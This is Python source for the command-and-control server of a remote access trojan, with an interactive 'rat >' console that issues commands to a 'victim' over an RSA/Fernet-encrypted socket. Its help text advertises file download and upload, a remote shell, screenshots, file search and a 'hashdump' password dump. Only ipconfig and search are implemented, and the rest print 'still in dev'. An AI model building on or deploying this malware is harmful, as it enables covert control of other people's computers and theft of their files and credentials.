#!/usr/bin/python3
from sys import argv
import socket
import rsa
from cryptography.fernet import Fernet
MSGLEN=4294967296

def help():
  print("""
COMMANDS :

  help                   Display this.
  download [file|path]   Get a file from the victim.
  upload   [file|path]   Put a file on the victim.
  shell                  Start a shell on the victim.
  ipconfig               Display the victim's IP configuration.
  screenshot             Take a screenshot from the victim's screen.
  search   file [path]   Find the location of a file in a directory, defaults to root directory.
  hashdump               Dump the sensitive data about users and passwords.
  exit                   Let the victim go.
""")

def ipconfig(victim):
  victim.send('ip')
  print(victim.receive())

def search(victim, filename, path):
  victim.send('search')
  victim.send(' '.join([filename,path]))
  result = (victim.receive())
  if result == "":
    print("File not found")
  else:
    print(result)

class SecureServer:
  def __init__(self, host="127.0.0.1", port=62832):
    self.public_key, self.private_key = rsa.newkeys(2048)
    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.sock.bind((host, port))
    self.sock.listen()
    self.client=None
    print(f"[*] Listening on {port}...")

  def handle_client(self):
    print("[+] Agent received !")
    using=True
    while using:
      cmd=input("rat > ")
      command=cmd.split(" ")[0]
      match command:
        case 'help':
          help()
        case 'download':
          print('command still in dev :/')
          #download(cmd.split(" ")[1:])
        case 'upload':
          print('command still in dev :/')
          #upload(cmd.split(" ")[1:])
        case 'shell':
          print('command still in dev :/')
          #shell()
        case 'ipconfig':
          ipconfig(self)
        case 'screenshot':
          print('command still in dev :/')
          #screenshot()
        case 'search':
          check = cmd.split(" ")
          if len(check) ==2 and not "" in check:
            name = check[1]
            path = '/'
            search(self,name,path)
          elif len(check) ==3 and not "" in check :
            path = check[1]
            name = check[2]
            search(self,name,path)
          else:
            print("search file [path] Find the location of a file in a directory, defaults to root directory.")


        case 'hashdump':
          print('command still in dev :/')
          #hashdump()
        case '':
          pass
        case 'exit':
          using=False
        case _:
          print(f"Unknown command : {command}")
    self.send("exit")

  def run(self):
    running=True
    while running:
      print("[*] Waiting...", end="\r")
      self.client, client_address = self.sock.accept()
      self.client.send(self.public_key.save_pkcs1())
      self.key=Fernet(rsa.decrypt(self.client.recv(2048), self.private_key))
      self.handle_client()

  def stop(self):
    self.send("exit")
    self.sock.close()
    exit("\r Server stopped.")

  def send(self, message):
    if self.client==None:
      return
    msg=self.key.encrypt(str(message).encode('utf-8'))
    self.client.send(msg)

  def receive(self):
    msg=self.client.recv(MSGLEN)
    message=self.key.decrypt(msg).decode('utf-8')
    return message

  def get_text(self):
    text=[]
    for i in range(int(self.receive())):
      print(self.receive())
    return '\n'.join(text)

if __name__ == "__main__":
  try:
    port=int(argv[1])
    if port<1025 or port>65535:
      port=62832
  except:
    port=62832
  server=SecureServer(port=port)
  try:
    server.run()
  except KeyboardInterrupt:
    server.stop()
